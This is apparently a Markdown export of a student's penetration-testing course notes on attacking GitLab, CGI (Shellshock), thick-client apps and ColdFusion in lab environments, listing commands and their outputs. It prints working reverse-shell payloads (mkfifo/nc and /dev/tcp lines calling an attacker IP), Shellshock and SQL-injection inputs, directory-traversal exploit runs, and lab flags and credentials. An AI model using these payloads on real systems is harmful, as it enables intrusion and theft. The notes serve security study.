---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "Attacking Common Applications"
output_topics: 50
---

# Attacking Common Applications — Outputs 101–150

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

Return to [[Outputs/Modules/Attacking Common Applications Outputs|Attacking Common Applications output index]].

## Outputs

> [!output]+ 🟨 Output 101
> GitLab
>
> **Source path:** Attacking Common Applications → Part 2 → Gitlab - Discovery &amp; Enumeration → Footprinting &amp; Discovery → browsing to the GitLab URL → /users/sign_in → GitLab
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 32258903-f0e4-43f7-aace-97bbcaf192f1 -->

> [!output]+ 🟨 Output 102
> 13.10.2
>
> **Source path:** Attacking Common Applications → Part 2 → Gitlab - Discovery &amp; Enumeration → LAB → Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number? → /help → 13.10.2
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a43fedcb-f363-41c1-9df8-69473f974ca8 -->

> [!output]+ 🟨 Output 103
> &lt;var name="db_password" value="postgres"/&gt;
>
> **Source path:** Attacking Common Applications → Part 2 → Gitlab - Discovery &amp; Enumeration → LAB → Find the PostgreSQL database password in the example project. → invistigate public projects &gt; All → inlanefreight-dev / phpunit_pgsql.xml → &lt;var name="db_password" value="postgres"/&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3d84afaf-6b7c-4a33-85a8-e07c51447869 -->

> [!output]+ 🟨 Output 104
> [+] The username root exists!
> [+] The username bob exists!
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking GitLab → Username Enumeration → Downloading the script and running it → ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt → [+] The username root exists! [+] The username bob exists!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e945fa90-43a7-4644-9bdd-9778b9cb16a5 -->

> [!output]+ 🟨 Output 105
> connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking GitLab → Authenticated Remote Code Execution → exploit to achieve RCE. → https://www.exploit-db.com/exploits/49951 → python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.15 8443 &gt;/tmp/f ' → connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2fe215d7-9ea0-47e9-9df3-8fa24c624aea -->

> [!output]+ 🟨 Output 106
> uid=996(git) gid=997(git) groups=997(git)
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking GitLab → Authenticated Remote Code Execution → exploit to achieve RCE. → https://www.exploit-db.com/exploits/49951 → python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.15 8443 &gt;/tmp/f ' → connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054 → id → uid=996(git) gid=997(git) groups=997(git)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5a52bb54-040c-45d4-b56c-c07a44dbefa0 -->

> [!output]+ 🟨 Output 107
> [+] The username demo exists!
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking GitLab → LAB → Find another valid user on the target GitLab instance. → git clone https://github.com/dpgg101/GitLabUserEnum.git → python gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt → [+] The username demo exists!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 38f6977f-8228-4b0f-936c-95ddf2b9d9c4 -->

> [!output]+ 🟨 Output 108
> git@app04:~/gitlab-workhorse$
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking GitLab → LAB → Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in. → https://www.exploit-db.com/exploits/49951 → python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.2 8443 &gt;/tmp/f ' → git@app04:~/gitlab-workhorse$
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b601d78d-fbcf-4da2-935c-57264eed6135 -->

> [!output]+ 🟨 Output 109
> s3cure_y0ur_Rep0s!
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking GitLab → LAB → Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in. → https://www.exploit-db.com/exploits/49951 → python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.2 8443 &gt;/tmp/f ' → git@app04:~/gitlab-workhorse$ → cat flag_gitlab.txt → s3cure_y0ur_Rep0s!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7e35352d-cfd4-4125-8207-a33912c125c6 -->

> [!output]+ 🟨 Output 110
> /access.cgi
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Common Gateway Interface (CGI) Applications - Shellshock → Enumeration → gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi → /access.cgi
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 70ea4d2a-9859-4377-b574-cd2bdef75581 -->

> [!output]+ 🟨 Output 111
> root:x:...
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Common Gateway Interface (CGI) Applications - Shellshock → Enumeration → Confirming the Vulnerability → curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi → root:x:...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 872c655b-540d-4f6e-b1e8-a9dc38bdf985 -->

> [!output]+ 🟨 Output 112
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Common Gateway Interface (CGI) Applications - Shellshock → Exploitation to Reverse Shell Access → id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 303f126b-065f-4a4b-b67f-f0f9d76b8a2a -->

> [!output]+ 🟨 Output 113
> /access.cgi
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Common Gateway Interface (CGI) Applications - Shellshock → LAB → Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server. → gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi → /access.cgi
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 35243197-eb22-4411-934a-2b995a37d68f -->

> [!output]+ 🟨 Output 114
> Sh3ll_Sh0cK_123
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Common Gateway Interface (CGI) Applications - Shellshock → LAB → Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server. → sudo nc -lvnp 7777 → curl -H 'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.2/7777 0&gt;&amp;1' http://10.129.204.231/cgi-bin/access.cgi → cat flag.txt → Sh3ll_Sh0cK_123
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 886f7cd5-a186-41e0-9cca-f33b759767c6 -->

> [!output]+ 🟨 Output 115
> &lt;SNIP&gt;
> "#M
> z\V
> ).NETFramework,Version=v4.0,Profile=Client
> FrameworkDisplayName
> .NET Framework 4 Client Profile
> &lt;SNIP&gt;
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → The scenario → return to the Memory Map pane → C:\&gt; C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin → &lt;SNIP&gt;  "#M  z\V  ).NETFramework,Version=v4.0,Profile=Client  FrameworkDisplayName  .NET Framework 4 Client Profile  &lt;SNIP&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bbf45676-d6a5-4ea3-b38b-f0cd930ae53a -->

> [!output]+ 🟨 Output 116
> we can see it created file in C:\Users\cybervaca\AppData\Local\Temp\2\9BF2.tmp
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → LAB → Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password. → Run Procmon64 → Invistigate the Path of each action did by the process → we can see it created file in C:\Users\cybervaca\AppData\Local\Temp\2\9BF2.tmp
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ee78d877-0d77-403d-931c-4cc7e09b9930 -->

> [!output]+ 🟨 Output 117
> \9BF2.tmp\9BF2.bat
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → LAB → Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password. → Run Procmon64 → Invistigate the Path of each action did by the process → we can see it created file in C:\Users\cybervaca\AppData\Local\Temp\2\9BF2.tmp → \9BF2.tmp\9BF2.bat
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 25143891-8791-42fe-b74b-ad8215d9d2f1 -->

> [!output]+ 🟨 Output 118
> del c: \programdata\monta.ps1
> del c: \programdata\oracle.txt
> ..
> del c: \programdata\restart-service.exe
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → LAB → Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password. → Inspect \Temp Folder → 2 → B608.bat → del c: \programdata\monta.ps1 del c: \programdata\oracle.txt .. del c: \programdata\restart-service.exe
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7f2456cf-fcb1-4a17-a032-f17cbedd8c22 -->

> [!output]+ 🟨 Output 119
> Inspect \programdata\oracle.txt
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → LAB → Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password. → Inspect \programdata\oracle.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c113f44d-9fef-4322-a3e2-e025341e7942 -->

> [!output]+ 🟨 Output 120
> File type:   Windows Portable Executable
> Extension:   exe,dll,drv,vxd,sys,ocx,vbx,com,fon,scr
> MIME type:   application/vnd.microsoft.portable-executable
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → LAB → Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password. → Inspect \programdata\oracle.txt → oracle.txt → decode base64 in cyberchief → File type:   Windows Portable Executable Extension:   exe,dll,drv,vxd,sys,ocx,vbx,com,fon,scr MIME type:   application/vnd.microsoft.portable-executable
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d0d5fe99-0db8-404a-8b4b-bd2bf91aa205 -->

> [!output]+ 🟨 Output 121
> $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → LAB → Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password. → Inspect \programdata\oracle.txt → monta.ps1 → $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9e263dd2-0679-4230-a173-9a5024d09b17 -->

> [!output]+ 🟨 Output 122
> by Helpdesk 2010
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → LAB → Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password. → Inspect \programdata\oracle.txt → monta.ps1 → $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) → run as administrator in PSH → restart-service.exe have been created → run as administrator → by Helpdesk 2010
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8847764a-c31c-4876-b5a0-5c8472c4d128 -->

> [!output]+ 🟨 Output 123
> &lt;SNIP&gt;
> "#M
> z\V
> ).NETFramework,Version=v4.0,Profile=Client
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → LAB → Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password. → run x64dbg → go to Follow in Memory Map → Memory-mapped (since its regular buffer in memory can be good plce to look for hardcoded credentials) → look for Type : MAP  and protection set to -RW-- and size 3000. → Right Click &gt; Dump memory into file → Powershell as admin → .\strings64.exe C:\TOOLS\xdgb\release\x64\restart-service_0000000000AC0000.bin → &lt;SNIP&gt; "#M z\V ).NETFramework,Version=v4.0,Profile=Client
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: eeb5505d-5477-47c4-8cb4-4b88dfc30f0c -->

> [!output]+ 🟨 Output 124
> Saving C:\TOOLS\xdgb\release\x64\restart-service_0000000000AC0000-cleaned.bin
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Thick Client Applications → Retrieving hardcoded Credentials from Thick-Client Applications → LAB → Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password. → use De4Dot to reverse .NET → \de4dot.exe C:\TOOLS\xdgb\release\x64\restart-service_0000000000AC0000.bin → Saving C:\TOOLS\xdgb\release\x64\restart-service_0000000000AC0000-cleaned.bin
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9bdfdb18-8793-4dce-ac79-bc6591d141ac -->

> [!output]+ 🟨 Output 125
> Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
> LineNumber : 13
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → search all the files for port 8000. → run PowerShell as administrator → ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List → Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml  LineNumber : 13
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 617e2441-ebcd-461e-bbc3-89314adbe6a8 -->

> [!output]+ 🟨 Output 126
> &lt;constructor-arg index="1" value = "8000"/&gt;
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → search all the files for port 8000. → run PowerShell as administrator → ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List → Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml  LineNumber : 13 → cat fatty-client\beans.xml → &lt;constructor-arg index="1" value = "8000"/&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d0400224-b24b-4cf7-910a-af718b35a460 -->

> [!output]+ 🟨 Output 127
> &lt;property name = "secret" value = "clarabibiclarabibiclarabibi"/&gt;
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → search all the files for port 8000. → run PowerShell as administrator → ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List → Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml  LineNumber : 13 → cat fatty-client\beans.xml → &lt;property name = "secret" value = "clarabibiclarabibiclarabibi"/&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 076d9756-984e-4759-be69-34afbdfe6b5b -->

> [!output]+ 🟨 Output 128
> Manifest-Version: 1.0
> Archiver-Version: Plexus Archiver
> Built-By: root
> Sealed: True
> Created-By: Apache Maven 3.3.9
> Build-Jdk: 1.8.0_232
> Main-Class: htb.fatty.client.run.Starter
>
> Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
> SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=
>
> Name: org/springframework/jmx/export/metadata/ManagedOperationParamete
>  r.class
> SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
> &lt;SNIP&gt;
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → search all the files for port 8000. → run PowerShell as administrator → ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List → Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml  LineNumber : 13 → edit the line &lt;constructor-arg index="1" value = "8000"/&gt; and set the port to 1337 → Running the edited application will fail due to an SHA-256 digest mismatch. → These hashes are present in the file META-INF/MANIFEST.MF. → cat fatty-client\META-INF\MANIFEST.MF → Manifest-Version: 1.0  Archiver-Version: Plexus Archiver  Built-By: root  Sealed: True  Created-By: Apache Maven 3.3.9  Build-Jdk: 1.8.0_232  Main-Class: htb.fatty.client.run.Starter    Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties  SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=    Name: org/springframework/jmx/export/metadata/ManagedOperationParamete   r.class  SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=  &lt;SNIP&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3ca16c72-b574-4cfa-b54b-43c55fcd46ff -->

> [!output]+ 🟨 Output 129
> few critical issues in the application still need to be fixed
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → Foothold → FileBrowser → Notes.txt reveals the file security.txt. Clicking the Open → few critical issues in the application still need to be fixed
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 97f3f993-e9e9-4dc7-ad50-2abc991f2640 -->

> [!output]+ 🟨 Output 130
> all admin users are removed from the database.
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → Foothold → FileBrowser → Mail → dave.txt file containing interesting information → all admin users are removed from the database.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7a361517-f788-4406-9da3-1af42043d6de -->

> [!output]+ 🟨 Output 131
> logs
> tar
> start.sh
> fatty-server.jar
> files
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → Foothold → Let's log in to the application and navigate to FileBrowser -&gt; Config → This is successful. We can now see the content of the directory configs/../ → logs tar start.sh fatty-server.jar files
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e745006e-48f4-482a-a4da-bd06347f5da2 -->

> [!output]+ 🟨 Output 132
> ClientGuiTest.this.user = new User() ;
> ClientGuiTest.this. user. setUsername(str1);
> ClientGuiTest.this.user.setPassword(str2);
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → SQL Injection → Decompiling the fatty-server.jar using JD-GUI → Let's check how the client application sends credentials to the server. → ClientGuiTest.this.user = new User() ; ClientGuiTest.this. user. setUsername(str1); ClientGuiTest.this.user.setPassword(str2);
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ecb74f3a-56a7-4243-a81e-c5f62a53b11f -->

> [!output]+ 🟨 Output 133
> SELECT
> id, username, email, password, role FROM users WHERE username='qtc" &lt;==
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → SQL Injection → edit the code in the fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java → ClientGuiTest.this.currentFolder = "../logs";    try {      response = ClientGuiTest.this.invoker.showFiles("../logs"); → Listing the content of the error-log.txt file so we can see it in FileBrowser → Login into the application using the username qtc' → error-log.txt via LFI ? → SELECT id, username, email, password, role FROM users WHERE username='qtc" &lt;==
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 11cf92b5-099a-403e-be18-84602a4e65de -->

> [!output]+ 🟨 Output 134
> Manifest-Version: 1.0
> Archiver-Version: Plexus Archiver
> Built-By: root
> Sealed: True
> Created-By: Apache Maven 3.3.9
> Build-Jdk: 1.8.0_232
> Main-Class: htb.fatty.client.run.Starter
>
> PS C:\Apps\fatty-client\META-INF&gt;
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → SQL Injection → LAB → What is the IP address of the eth0 interface under the ServerStatus -&gt; Ipconfig tab in the fatty-client application? → bypass integrity check → Edit the content files → META-INF\MANIFEST.MF → Delete all the contaent and leave the Head of the file → cat .\MANIFEST.MF → Manifest-Version: 1.0 Archiver-Version: Plexus Archiver Built-By: root Sealed: True Created-By: Apache Maven 3.3.9 Build-Jdk: 1.8.0_232 Main-Class: htb.fatty.client.run.Starter  PS C:\Apps\fatty-client\META-INF&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 75999976-75cc-40d5-b335-7d4828ec88c9 -->

> [!output]+ 🟨 Output 135
> Error: You action cause an error on application server!
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → SQL Injection → LAB → What is the IP address of the eth0 interface under the ServerStatus -&gt; Ipconfig tab in the fatty-client application? → Path traversal → Error: You action cause an error on application server!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: efa44e26-b73f-45fa-b01f-bca164744378 -->

> [!output]+ 🟨 Output 136
> Your Action caused an error on application server!
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → SQL Injection → LAB → What is the IP address of the eth0 interface under the ServerStatus -&gt; Ipconfig tab in the fatty-client application? → bypass password hashing validation → HTB Steps to compile (Failed) → opan traverse.jar and login → Filebrowser → select error-log.txt → Your Action caused an error on application server!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ebc7eec6-bad1-4653-959b-cbbf1c17c703 -->

> [!output]+ 🟨 Output 137
> Login Successful
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → SQL Injection → LAB → What is the IP address of the eth0 interface under the ServerStatus -&gt; Ipconfig tab in the fatty-client application? → run travers and login → username: abc' UNION SELECT 1,'abc','a@b.com','abc','admin → password: abc → Login Successful
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 78d856f2-5a40-4820-9c02-12d4a3294b2f -->

> [!output]+ 🟨 Output 138
> 172.28.0.3
>
> **Source path:** Attacking Common Applications → Part 2 → Exploiting Web Vulnerabilities in Thick-Client Applications → scenario → SQL Injection → LAB → What is the IP address of the eth0 interface under the ServerStatus -&gt; Ipconfig tab in the fatty-client application? → run travers and login → Click on ServerStatus &gt; IPconfig → 172.28.0.3
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: de7abf61-8534-44bf-89aa-aaf26b8be08b -->

> [!output]+ 🟨 Output 139
> 135/tcp   open  msrpc
> 8500/tcp  open  fmtp
> 49154/tcp open  unknown
>
> **Source path:** Attacking Common Applications → Part 3 → ColdFusion - Discovery &amp; Enumeration → Enumeration → nmap -p- -sC -Pn 10.129.247.30 --open → 135/tcp   open  msrpc 8500/tcp  open  fmtp 49154/tcp open  unknown
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: dd97d015-1c1d-4293-9b19-38b0af091933 -->

> [!output]+ 🟨 Output 140
> ColdFusion 8
>
> **Source path:** Attacking Common Applications → Part 3 → ColdFusion - Discovery &amp; Enumeration → Enumeration → nmap -p- -sC -Pn 10.129.247.30 --open → 135/tcp   open  msrpc 8500/tcp  open  fmtp 49154/tcp open  unknown → Navigating to the IP:8500 → ists 2 directories, CFIDE and cfdocs → /CFIDE/administrator → ColdFusion 8
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ac86aca5-8c78-4be4-b94a-d20e65c6bdf9 -->

> [!output]+ 🟨 Output 141
> 135/tcp   open  msrpc
> 8500/tcp  open  fmtp
> 49154/tcp open  unknown
>
> **Source path:** Attacking Common Applications → Part 3 → ColdFusion - Discovery &amp; Enumeration → LAB → What ColdFusion protocol runs on port 5500? → nmap -p- -sC -Pn 10.129.1.12 --open → 135/tcp   open  msrpc 8500/tcp  open  fmtp 49154/tcp open  unknown
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8e955a2d-5509-4a88-9c87-61a1cecc5e5d -->

> [!output]+ 🟨 Output 142
> Server Monitor
>
> **Source path:** Attacking Common Applications → Part 3 → ColdFusion - Discovery &amp; Enumeration → LAB → What ColdFusion protocol runs on port 5500? → Server Monitor
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5fc8319d-4057-4af3-8ccf-970315067d24 -->

> [!output]+ 🟨 Output 143
> Adobe ColdFusion 8 - Remote Command Execution (RCE)
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking ColdFusion → check for existing known exploits → searchsploit adobe coldfusion → Adobe ColdFusion 8 - Remote Command Execution (RCE)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4f31e0fc-3379-4b21-bc7a-62af1c269c40 -->

> [!output]+ 🟨 Output 144
> Adobe ColdFusion - Directory Traversal (Metasploit)
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking ColdFusion → check for existing known exploits → searchsploit adobe coldfusion → Adobe ColdFusion - Directory Traversal (Metasploit)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 708ba482-574e-4922-abdd-073d597fbb76 -->

> [!output]+ 🟨 Output 145
> rdspassword=0IA/F\[\[E&gt;[$_6&amp; \\Q&gt;[K\=XP  \n
> password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
> encrypted=true
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking ColdFusion → check for existing known exploits → Directory Traversal → python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties" → rdspassword=0IA/F\[\[E&gt;[$_6&amp; \\Q&gt;[K\=XP  \n  password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03  encrypted=true
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ef767150-2cda-4235-89b2-0c1c954bbd09 -->

> [!output]+ 🟨 Output 146
> C:\ColdFusion8\runtime\bin&gt;
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking ColdFusion → check for existing known exploits → Unauthenticated RCE → searchsploit -p 50057 → cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py . → if __name__ == '__main__':      # Define some information      lhost = '10.10.14.55' # HTB VPN IP      lport = 4444 # A port not in use on localhost      rhost = "10.129.247.30" # Target IP      rport = 8500 # Target Port      filename = uuid.uuid4().hex → python3 50057.py → Reverse Shell → C:\ColdFusion8\runtime\bin&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f0bb7720-173a-44bd-ac38-89cd6ea98e3c -->

> [!output]+ 🟨 Output 147
> C:\ColdFusion8\runtime\bin&gt;
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking ColdFusion → LAB → What user is ColdFusion running as? → searchsploit adobe coldfusion → searchsploit -m 50057 → nano 50057.py → modify lhost and rhost → python 50057.py → C:\ColdFusion8\runtime\bin&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: cd83e2bf-be4b-4ffd-9c51-7103fdf4915f -->

> [!output]+ 🟨 Output 148
> arctic\tolis
>
> **Source path:** Attacking Common Applications → Part 3 → Attacking ColdFusion → LAB → What user is ColdFusion running as? → searchsploit adobe coldfusion → searchsploit -m 50057 → nano 50057.py → modify lhost and rhost → python 50057.py → C:\ColdFusion8\runtime\bin&gt; → whoami → arctic\tolis
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 67c7ab23-ed13-48d2-9db9-70d34a4cabd5 -->

> [!output]+ 🟨 Output 149
> 200 OK
>
> **Source path:** Attacking Common Applications → Part 3 → IIS Tilde Enumeration → Intro → http://example.com/~s → 200 OK
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5d0df12d-586e-4ce9-8c36-eb27b0de7216 -->

> [!output]+ 🟨 Output 150
> 200 OK
>
> **Source path:** Attacking Common Applications → Part 3 → IIS Tilde Enumeration → Intro → http://example.com/~s → 200 OK → revealing a directory with a short name beginning with "s" → http://example.com/~se → 200 OK
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 550d8ed6-ea5a-424b-9b86-a5b02871aaa5 -->
